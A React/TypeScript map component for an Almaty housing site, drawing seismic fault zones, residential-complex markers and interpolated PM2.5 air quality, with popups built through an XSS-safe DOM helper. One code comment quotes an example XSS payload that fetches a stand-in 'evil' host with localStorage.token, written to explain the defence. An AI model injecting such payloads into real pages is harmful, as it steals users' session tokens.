"use client";

import { useEffect, useRef, useState, useMemo, useCallback } from "react";
import { useTranslation } from "react-i18next";
import maplibregl from "maplibre-gl";
import "maplibre-gl/dist/maplibre-gl.css";
import type { MapData } from "@/hooks/useComplexes";
import { formatPrice } from "@/lib/utils";
import { useTheme } from "@/components/theme-provider";
import { generateInterpolatedGrid } from "@/lib/airquality-interpolation";

interface MapViewProps {
  data: MapData;
  onComplexClick?: (complexId: string) => void;
  hoveredComplexId?: string | null;
  selectedComplexId?: string | null;
}

function getScoreColor(score: number | null): string {
  if (!score) return "#999";
  if (score >= 85) return "#22c55e";
  if (score >= 70) return "#eab308";
  return "#f97316";
}

function getSeismicColor(risk: string | null): string {
  if (!risk) return "#999";
  const colors: Record<string, string> = {
    critical: "#dc2626", high: "#f97316", moderate: "#eab308",
    low: "#84cc16", safe: "#22c55e",
  };
  return colors[risk] || "#999";
}

function getSeismicLabelKey(risk: string | null): string | null {
  const keys: Record<string, string> = {
    critical: "map.seismicOnFault",
    high: "map.seismicDanger",
    moderate: "map.seismicWatch",
    low: "map.seismicLow",
    safe: "map.seismicSafe",
  };
  return keys[risk || ""] || null;
}

/** Same idea for AirKaz level — map structured `level` to translation key
 *  so the station popup localises instead of showing the RU `levelLabel`. */
function getAirLabelKey(level: string | null | undefined): string | null {
  const keys: Record<string, string> = {
    good: "complex.airGood",
    moderate: "complex.airModerate",
    sensitive: "complex.airSensitive",
    unhealthy: "complex.airUnhealthy",
    very_unhealthy: "complex.airVeryUnhealthy",
    hazardous: "complex.airHazardous",
  };
  return keys[level || ""] || null;
}

function getFaultColor(danger: number): string {
  if (danger >= 3) return "#dc2626";
  if (danger >= 2) return "#f97316";
  return "#9ca3af";
}

/**
 * XSS-safe DOM builder for popup content. We can't use template-string +
 * setHTML here because complex `displayName` and air-station `name` are
 * derived from third-party data (Krisha listings, AirKaz API) — a malicious
 * listing with a name like `<img onerror="fetch('//evil/'+localStorage.token)">`
 * would otherwise execute on every map hover.
 *
 * `text:` always goes through textContent (auto-escapes). Use `html:` only
 * for known-safe static markup (no user data).
 */
function el(
  tag: string,
  opts: {
    css?: string;
    text?: string;
    html?: string;
    children?: (Node | null | false | undefined)[];
  } = {},
): HTMLElement {
  const node = document.createElement(tag);
  if (opts.css) node.style.cssText = opts.css;
  if (opts.text != null) node.textContent = opts.text;
  if (opts.html != null) node.innerHTML = opts.html;
  if (opts.children) {
    for (const c of opts.children) if (c) node.appendChild(c);
  }
  return node;
}

// MapTiler free key for 3D building tiles
const MAPTILER_KEY = "get_your_own_OpIi9ZULNHzrESv6T2vL";
const MAP_STYLE_LIGHT = "https://basemaps.cartocdn.com/gl/positron-gl-style/style.json";
const MAP_STYLE_DARK = "https://basemaps.cartocdn.com/gl/dark-matter-gl-style/style.json";

export default function MapView({ data, onComplexClick, hoveredComplexId, selectedComplexId }: MapViewProps) {
  const { t, i18n } = useTranslation();
  const tRef = useRef(t);
  tRef.current = t;
  const langRef = useRef(i18n.language);
  langRef.current = i18n.language;
  const mapContainer = useRef<HTMLDivElement>(null);
  const mapRef = useRef<maplibregl.Map | null>(null);
  // Layer visibility — все включены по умолчанию.
  // Risk zones всегда вместе с разломами (без них теряют смысл).
  // Маркеры ЖК всегда раскрашены по сейсмическому риску — это важнее
  // общего рейтинга для решения о покупке.
  const [showFaults, setShowFaults] = useState(true);
  const [showAirQuality, setShowAirQuality] = useState(true);
  const { resolvedTheme } = useTheme();
  const isDark = resolvedTheme === "dark";

  const riskCounts = useMemo(() => {
    const counts: Record<string, number> = { critical: 0, high: 0, moderate: 0, low: 0, safe: 0 };
    data.complexes.forEach((c) => {
      const risk = c.seismicRiskLevel || "safe";
      counts[risk] = (counts[risk] || 0) + 1;
    });
    return counts;
  }, [data.complexes]);

  // Virtual grid of IDW-interpolated PM 2.5 points covering Almaty.
  // Recomputed only when station readings change. ~30-50ms for 60×60 grid.
  const airGrid = useMemo(() => {
    if (!data.airStations || data.airStations.length === 0) return [];
    return generateInterpolatedGrid(
      data.airStations.map((s: any) => ({ lat: s.lat, lng: s.lng, pm25: s.pm25 })),
      60,  // cols
      60,  // rows
      8,   // top-K nearest neighbors
    );
  }, [data.airStations]);

  const onComplexClickRef = useRef(onComplexClick);
  onComplexClickRef.current = onComplexClick;

  useEffect(() => {
    if (!mapContainer.current || mapRef.current) return;

    const map = new maplibregl.Map({
      container: mapContainer.current,
      style: isDark ? MAP_STYLE_DARK : MAP_STYLE_LIGHT,
      center: [76.9286, 43.238],
      zoom: 12,
      pitch: 45,
      bearing: -10,
    });

    map.addControl(new maplibregl.NavigationControl({ visualizePitch: true }), "top-right");
    mapRef.current = map;

    map.on("load", () => {
      // === FAULT RISK ZONES ===
      if (data.faultLines?.length > 0) {
        const allFaultFeatures = data.faultLines.map((f) => ({
          type: "Feature" as const,
          geometry: {
            type: "LineString" as const,
            coordinates: f.coordinates.map(([lat, lng]) => [lng, lat]),
          },
          properties: { name: f.name, label: f.label, danger: f.danger },
        }));

        map.addSource("faults-all", {
          type: "geojson",
          data: { type: "FeatureCollection", features: allFaultFeatures },
        });

        // Risk zone buffer layers
        const zones = [
          { id: "risk-zone-low", color: "#fef08a", opacity: 0.12, widths: [10, 4, 12, 16, 14, 60, 16, 200] },
          { id: "risk-zone-moderate", color: "#fed7aa", opacity: 0.18, widths: [10, 2, 12, 8, 14, 28, 16, 90] },
          { id: "risk-zone-high", color: "#fecaca", opacity: 0.25, widths: [10, 1, 12, 4, 14, 12, 16, 40] },
        ];

        for (const zone of zones) {
          map.addLayer({
            id: zone.id,
            type: "line",
            source: "faults-all",
            paint: {
              "line-color": zone.color,
              "line-width": ["interpolate", ["exponential", 2], ["zoom"], ...zone.widths],
              "line-opacity": zone.opacity,
            },
          });
        }

        // Actual fault lines
        for (const danger of [3, 2, 1]) {
          const faults = data.faultLines.filter((f) => f.danger === danger);
          if (faults.length === 0) continue;

          const features = faults.map((f) => ({
            type: "Feature" as const,
            geometry: {
              type: "LineString" as const,
              coordinates: f.coordinates.map(([lat, lng]) => [lng, lat]),
            },
            properties: { name: f.name, label: f.label, danger: f.danger },
          }));

          map.addSource(`faults-${danger}`, {
            type: "geojson",
            data: { type: "FeatureCollection", features },
          });

          map.addLayer({
            id: `faults-lines-${danger}`,
            type: "line",
            source: `faults-${danger}`,
            paint: {
              "line-color": getFaultColor(danger),
              "line-width": danger >= 3 ? 3 : 2,
              "line-opacity": 0.7,
              "line-dasharray": danger < 3 ? [2, 2] : [1],
            },
          });
        }

        // Fault click popup
        const faultPopup = new maplibregl.Popup({ closeButton: true, closeOnClick: true, maxWidth: "300px" });

        for (const danger of [3, 2, 1]) {
          const layerId = `faults-lines-${danger}`;
          map.on("mouseenter", layerId, () => { map.getCanvas().style.cursor = "crosshair"; });
          map.on("mouseleave", layerId, () => { map.getCanvas().style.cursor = ""; });

          map.on("click", layerId, (e) => {
            e.originalEvent.stopPropagation();
            const props = e.features?.[0]?.properties;
            if (!props) return;

            const dangerColor = props.danger >= 3 ? "#dc2626" : props.danger >= 2 ? "#f97316" : "#9ca3af";
            const dangerKey = props.danger >= 3 ? "map.faultConfirmed" : props.danger >= 2 ? "map.faultStudied" : "map.faultDisputed";

            const nearby = data.complexes
              .filter((c) => {
                const dist = Math.sqrt(Math.pow((c.lng - e.lngLat.lng) * 80, 2) + Math.pow((c.lat - e.lngLat.lat) * 111, 2));
                return dist < 1.5;
              })
              .sort((a, b) => (a.seismicDistanceMeters || 9999) - (b.seismicDistanceMeters || 9999))
              .slice(0, 5);

            const root = el("div", {
              css: "font-family:system-ui;padding:4px",
              children: [
                // Fault name — props.name is from our static FAULT_LINES JSON,
                // technically safe, but textContent is cheap insurance.
                el("div", {
                  css: "font-size:14px;font-weight:600;margin-bottom:4px",
                  text: String(props.name || ""),
                }),
                el("div", {
                  css: "font-size:12px",
                  children: [
                    el("span", {
                      css: `color:${dangerColor};font-weight:bold`,
                      text: tRef.current(dangerKey),
                    }),
                  ],
                }),
                nearby.length > 0
                  ? el("div", {
                      css: "margin-top:8px;border-top:1px solid #eee;padding-top:6px",
                      children: [
                        el("p", {
                          css: "font-size:11px;color:#666;margin-bottom:4px",
                          text: tRef.current("map.nearbyComplexes"),
                        }),
                        ...nearby.map((c) => {
                          const dist = c.seismicDistanceMeters
                            ? c.seismicDistanceMeters < 1000
                              ? `${c.seismicDistanceMeters} м`
                              : `${(c.seismicDistanceMeters / 1000).toFixed(1)} км`
                            : "—";
                          return el("div", {
                            css: "display:flex;align-items:center;gap:6px;margin-bottom:2px;font-size:12px",
                            children: [
                              el("span", {
                                css: `width:8px;height:8px;border-radius:50%;background:${getSeismicColor(c.seismicRiskLevel)};flex-shrink:0`,
                              }),
                              // c.displayName comes from Krisha — XSS vector. textContent escapes it.
                              el("span", { css: "flex:1", text: String(c.displayName || "") }),
                              el("span", { css: "color:#888", text: dist }),
                            ],
                          });
                        }),
                      ],
                    })
                  : null,
              ],
            });

            faultPopup.setLngLat(e.lngLat).setDOMContent(root).addTo(map);
          });
        }
      }

      // === AIR QUALITY (PM 2.5) — IDW-INTERPOLATED FIELD + STATION MARKERS ===
      if (data.airStations && data.airStations.length > 0) {
        // 1) IDW-interpolated grid (covers Almaty uniformly, no gaps).
        //    Each grid cell is a virtual point colored by interpolated PM 2.5.
        //    Rendered as blurred circles so adjacent cells blend smoothly.
        const gridFeatures = airGrid.map((g) => ({
          type: "Feature" as const,
          geometry: { type: "Point" as const, coordinates: [g.lng, g.lat] },
          properties: { pm25: g.pm25, color: g.color },
        }));

        map.addSource("air-grid", {
          type: "geojson",
          data: { type: "FeatureCollection", features: gridFeatures },
        });

        // Heatmap-like field via blurred circles.
        // - radius scales with zoom so adjacent grid points overlap
        // - circle-blur > 1 produces smooth gradient between cells
        // - opacity is moderate so basemap stays readable
        map.addLayer({
          id: "air-heatmap",
          type: "circle",
          source: "air-grid",
          // Default visible — matches showAirQuality state default (true).
          // Toggling is handled by the showAirQuality useEffect below.
          paint: {
            "circle-radius": [
              "interpolate", ["linear"], ["zoom"],
              9, 22,
              11, 28,
              13, 38,
              15, 60,
              17, 90,
            ],
            "circle-color": ["get", "color"],
            "circle-blur": 1.6,
            "circle-opacity": [
              "interpolate", ["linear"], ["zoom"],
              9, 0.55,
              13, 0.5,
              16, 0.4,
            ],
          },
        });

        // 2) Real station markers — interactive layer with popup.
        const stationFeatures = data.airStations.map((s: any) => ({
          type: "Feature" as const,
          geometry: { type: "Point" as const, coordinates: [s.lng, s.lat] },
          properties: {
            id: s.id,
            name: s.name,
            pm25: s.pm25,
            origin: s.origin || "",
            district: s.district || "",
            level: s.level,
            levelLabel: s.levelLabel,
            color: s.color,
            updatedAt: s.updatedAt,
          },
        }));

        map.addSource("air-stations", {
          type: "geojson",
          data: { type: "FeatureCollection", features: stationFeatures },
        });

        // Station marker dots — only at higher zoom (otherwise too cluttered)
        map.addLayer({
          id: "air-stations-circles",
          type: "circle",
          source: "air-stations",
          minzoom: 12,
          paint: {
            "circle-radius": [
              "interpolate", ["linear"], ["zoom"],
              12, 3, 14, 5, 17, 9,
            ],
            "circle-color": ["get", "color"],
            "circle-opacity": [
              "interpolate", ["linear"], ["zoom"],
              12, 0.5, 14, 0.85, 17, 1,
            ],
            "circle-stroke-width": 1,
            "circle-stroke-color": "#fff",
          },
        });

        // Station hover popup
        const stationPopup = new maplibregl.Popup({
          closeButton: false,
          closeOnClick: false,
          maxWidth: "240px",
        });
        map.on("mouseenter", "air-stations-circles", (e) => {
          map.getCanvas().style.cursor = "help";
          const f = e.features?.[0];
          if (!f) return;
          const p = f.properties;
          const coords = (f.geometry as any).coordinates.slice();
          const dateLocale = langRef.current?.startsWith("kk") ? "kk-KZ" : "ru-RU";
          const date = p.updatedAt ? new Date(p.updatedAt).toLocaleString(dateLocale, {
            day: "2-digit", month: "2-digit", hour: "2-digit", minute: "2-digit",
          }) : "";
          // Color is read from our backend's airKaz.classifyPm25 — bounded to a
          // known palette, but we still pass it through CSS-only context. Name,
          // origin, district come straight from upstream JSON: untrusted, so
          // textContent everywhere.
          const safeColor = String(p.color || "#666");
          const popupRoot = el("div", {
            css: "font-family:system-ui;padding:4px;font-size:12px",
            children: [
              el("div", {
                css: "display:flex;align-items:center;gap:6px;margin-bottom:4px",
                children: [
                  el("span", { css: `width:10px;height:10px;border-radius:50%;background:${safeColor}` }),
                  el("strong", { text: String(p.name || "") }),
                ],
              }),
              el("div", {
                css: `font-size:18px;font-weight:700;color:${safeColor}`,
                children: [
                  document.createTextNode(`${p.pm25} `),
                  el("span", {
                    css: "font-size:11px;font-weight:400;color:#666",
                    text: "µg/m³",
                  }),
                ],
              }),
              el("div", {
                css: `color:${safeColor};font-size:11px;font-weight:500`,
                text: (() => {
                  const key = getAirLabelKey(p.level);
                  return key ? tRef.current(key) : String(p.levelLabel || "");
                })(),
              }),
              p.origin
                ? el("div", {
                    css: "color:#888;font-size:10px;margin-top:4px",
                    text:
                      tRef.current("map.popupSource", { name: String(p.origin) }) +
                      (p.district ? " · " + String(p.district) : ""),
                  })
                : null,
              date ? el("div", { css: "color:#aaa;font-size:10px", text: date }) : null,
            ],
          });
          stationPopup.setLngLat(coords).setDOMContent(popupRoot).addTo(map);
        });
        map.on("mouseleave", "air-stations-circles", () => {
          map.getCanvas().style.cursor = "";
          stationPopup.remove();
        });
      }

      // === COMPLEX MARKERS ===
      const complexFeatures = data.complexes.map((c) => ({
        type: "Feature" as const,
        geometry: { type: "Point" as const, coordinates: [c.lng, c.lat] },
        properties: {
          id: c.id,
          name: c.displayName,
          score: c.scoreTotal,
          priceMin: c.priceMin,
          priceMax: c.priceMax,
          listings: c.listingsCount,
          commute: c.commuteMinutes,
          seismic: c.seismicRiskLevel,
          seismicDist: c.seismicDistanceMeters,
          district: c.district,
          scoreColor: getScoreColor(c.scoreTotal),
          seismicColor: getSeismicColor(c.seismicRiskLevel),
        },
      }));

      map.addSource("complexes", {
        type: "geojson",
        data: { type: "FeatureCollection", features: complexFeatures },
      });

      map.addLayer({
        id: "complexes-circles",
        type: "circle",
        source: "complexes",
        paint: {
          "circle-radius": ["interpolate", ["linear"], ["get", "listings"], 1, 8, 5, 12, 10, 16, 20, 20],
          "circle-color": ["get", "seismicColor"],
          "circle-opacity": 0.85,
          "circle-stroke-width": 2,
          "circle-stroke-color": "#fff",
        },
      });

      map.addLayer({
        id: "complexes-labels",
        type: "symbol",
        source: "complexes",
        layout: {
          "text-field": ["get", "name"],
          "text-size": 11,
          "text-offset": [0, 1.8],
          "text-anchor": "top",
          "text-max-width": 10,
        },
        paint: {
          "text-color": "#374151",
          "text-halo-color": "#fff",
          "text-halo-width": 1.5,
        },
      });

      // Hover popup
      const popup = new maplibregl.Popup({ closeButton: false, closeOnClick: false, maxWidth: "280px" });

      map.on("mouseenter", "complexes-circles", (e) => {
        map.getCanvas().style.cursor = "pointer";
        const feature = e.features?.[0];
        if (!feature) return;
        const props = feature.properties;
        const coords = (feature.geometry as any).coordinates.slice();

        const seismicDist = props.seismicDist;
        const seismicDistStr = seismicDist ? (seismicDist < 1000 ? `${seismicDist} м` : `${(seismicDist / 1000).toFixed(1)} км`) : "";
        const seismicRisk = props.seismic || "safe";
        const seismicBg = (seismicRisk === "critical" || seismicRisk === "high") ? "#fef2f2" : seismicRisk === "moderate" ? "#fffbeb" : "#f0fdf4";
        const seismicLabelKey = getSeismicLabelKey(seismicRisk);
        const seismicLabel = seismicLabelKey ? tRef.current(seismicLabelKey) : "";

        // props.name is the complex displayName, parsed from Krisha listing
        // pages — fully attacker-controlled. This is THE main XSS vector for
        // the public site, so build the popup as DOM nodes only.
        const safeScoreColor = String(props.scoreColor || "#666");
        const popupRoot = el("div", {
          css: "font-family:system-ui;padding:4px",
          children: [
            el("div", {
              css: "display:flex;align-items:center;gap:8px;margin-bottom:4px",
              children: [
                el("strong", { css: "font-size:14px", text: String(props.name || "") }),
                props.score
                  ? el("span", {
                      css: `background:${safeScoreColor};color:white;padding:2px 8px;border-radius:12px;font-weight:bold;font-size:12px`,
                      text: `${Math.round(props.score)}%`,
                    })
                  : null,
              ],
            }),
            props.priceMin && props.priceMax
              ? el("div", {
                  css: "font-weight:600;margin-top:4px",
                  text: `${formatPrice(props.priceMin)} — ${formatPrice(props.priceMax)}`,
                })
              : null,
            el("div", {
              css: "display:flex;gap:12px;margin-top:4px;color:#666;font-size:12px",
              children: [
                el("span", {
                  text: `🏠 ${tRef.current("map.popupListings", { count: props.listings })}`,
                }),
                // Commute deliberately hidden from the hover popup. The map
                // shows complexes deduplicated globally, so the commute
                // value comes from whichever project copy "won" — not from
                // the viewer's actual destination. Misleading to show. The
                // slide-over surfaces it only for authenticated users where
                // it actually maps to their interview answers.
              ],
            }),
            seismicDist
              ? el("div", {
                  css: `display:flex;align-items:center;gap:6px;margin-top:6px;padding:4px 6px;border-radius:6px;font-size:11px;background:${seismicBg}`,
                  children: [
                    el("span", {
                      css: `width:8px;height:8px;border-radius:50%;background:${getSeismicColor(seismicRisk)};flex-shrink:0`,
                    }),
                    el("span", { text: seismicLabel }),
                    el("span", {
                      css: "color:#888;margin-left:auto",
                      text: `${seismicDistStr} ${tRef.current("map.toFault")}`,
                    }),
                  ],
                })
              : null,
          ],
        });
        popup.setLngLat(coords).setDOMContent(popupRoot).addTo(map);
      });

      map.on("mouseleave", "complexes-circles", () => {
        map.getCanvas().style.cursor = "";
        popup.remove();
      });

      map.on("click", "complexes-circles", (e) => {
        e.originalEvent.stopPropagation();
        const id = e.features?.[0]?.properties?.id;
        if (id && onComplexClickRef.current) onComplexClickRef.current(id);
      });

      // Fit bounds
      if (complexFeatures.length > 0) {
        const bounds = new maplibregl.LngLatBounds();
        complexFeatures.forEach((f) => bounds.extend(f.geometry.coordinates as [number, number]));
        map.fitBounds(bounds, { padding: 80, maxZoom: 14, pitch: 45 });
      }
    });

    return () => { map.remove(); mapRef.current = null; };
  }, [data, isDark, airGrid]);

  // Fly to selected complex
  useEffect(() => {
    const map = mapRef.current;
    if (!map || !selectedComplexId) return;
    const complex = data.complexes.find((c) => c.id === selectedComplexId);
    if (complex) {
      map.flyTo({ center: [complex.lng, complex.lat], zoom: 15, pitch: 50, duration: 1500 });
    }
  }, [selectedComplexId, data.complexes]);

  // Highlight hovered complex
  useEffect(() => {
    const map = mapRef.current;
    if (!map || !map.isStyleLoaded() || !map.getLayer("complexes-circles")) return;

    if (hoveredComplexId) {
      map.setPaintProperty("complexes-circles", "circle-stroke-width", [
        "case",
        ["==", ["get", "id"], hoveredComplexId], 4,
        2,
      ]);
      map.setPaintProperty("complexes-circles", "circle-stroke-color", [
        "case",
        ["==", ["get", "id"], hoveredComplexId], "#3b82f6",
        "#fff",
      ]);
    } else {
      map.setPaintProperty("complexes-circles", "circle-stroke-width", 2);
      map.setPaintProperty("complexes-circles", "circle-stroke-color", "#fff");
    }
  }, [hoveredComplexId]);

  // Toggle fault lines + their risk zones together.
  // Wraps the apply in a style-load guard: if the map style hasn't finished
  // loading yet (common on first mount), retry once on the next "idle" event.
  useEffect(() => {
    const map = mapRef.current;
    if (!map) return;
    const visibility = showFaults ? "visible" : "none";
    const apply = () => {
      for (const danger of [1, 2, 3]) {
        const layerId = `faults-lines-${danger}`;
        if (map.getLayer(layerId))
          map.setLayoutProperty(layerId, "visibility", visibility);
      }
      for (const id of ["risk-zone-low", "risk-zone-moderate", "risk-zone-high"]) {
        if (map.getLayer(id))
          map.setLayoutProperty(id, "visibility", visibility);
      }
    };
    if (map.isStyleLoaded()) apply();
    else map.once("idle", apply);
  }, [showFaults]);

  // Toggle air quality layers (heatmap + station markers)
  useEffect(() => {
    const map = mapRef.current;
    if (!map) return;
    const visibility = showAirQuality ? "visible" : "none";
    const apply = () => {
      for (const id of ["air-heatmap", "air-stations-circles"]) {
        if (map.getLayer(id))
          map.setLayoutProperty(id, "visibility", visibility);
      }
    };
    if (map.isStyleLoaded()) apply();
    else map.once("idle", apply);
  }, [showAirQuality]);

  return (
    <div className="relative w-full h-full">
      <div ref={mapContainer} className="w-full h-full" />

      {/* Controls — layer toggles */}
      <div className="absolute top-2 left-2 sm:top-3 sm:left-3 bg-card/95 text-card-foreground border border-border backdrop-blur rounded-lg shadow-lg p-2 sm:p-3 space-y-1.5 max-w-[160px] sm:max-w-[180px] z-10">
        <p className="text-[10px] font-semibold text-muted-foreground uppercase tracking-wide">{t("map.layers")}</p>
        <label className="flex items-center gap-2 text-xs cursor-pointer">
          <input
            type="checkbox"
            checked={showFaults}
            onChange={(e) => setShowFaults(e.target.checked)}
            className="rounded accent-red-500 w-3.5 h-3.5"
          />
          {t("map.faultLines")}
        </label>
        <label className="flex items-center gap-2 text-xs cursor-pointer">
          <input
            type="checkbox"
            checked={showAirQuality}
            onChange={(e) => setShowAirQuality(e.target.checked)}
            className="rounded accent-emerald-500 w-3.5 h-3.5"
          />
          {t("map.airQuality")}
        </label>
      </div>

      {/* Compact legend */}
      <div className="absolute bottom-2 left-2 sm:bottom-3 sm:left-3 bg-card/95 text-card-foreground border border-border backdrop-blur rounded-lg shadow-lg p-2 sm:p-2.5 text-[9px] sm:text-[10px] space-y-0.5 sm:space-y-1 z-10">
        <div className="font-medium text-[10px]">{t("map.legend")}</div>
        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-green-500" />{t("map.legendSafe")} ({riskCounts.safe})</div>
        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-yellow-500" />{t("map.legendModerate")} ({riskCounts.moderate})</div>
        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-orange-500" />{t("map.legendHigh")} ({riskCounts.high})</div>
        <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-red-600" />{t("map.legendCritical")} ({riskCounts.critical})</div>
        {showFaults && (
          <div className="border-t pt-1 mt-1 space-y-0.5">
            <div className="flex items-center gap-1.5"><span className="w-3 h-px bg-red-600" />{t("map.faultLabel")}</div>
          </div>
        )}
        {showAirQuality && (
          <div className="border-t pt-1 mt-1 space-y-0.5">
            <div className="font-medium text-[10px]">
              {t("map.pmTitle")}
              {data.airStations && (
                <span className="text-muted-foreground font-normal ml-1">
                  · {t("map.pmStations", { count: data.airStations.length })}
                </span>
              )}
            </div>
            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-green-500" />{t("map.pmGood")}</div>
            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-yellow-500" />{t("map.pmModerate")}</div>
            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-orange-500" />{t("map.pmSensitive")}</div>
            <div className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-red-600" />{t("map.pmUnhealthy")}</div>
          </div>
        )}
      </div>
    </div>
  );
}
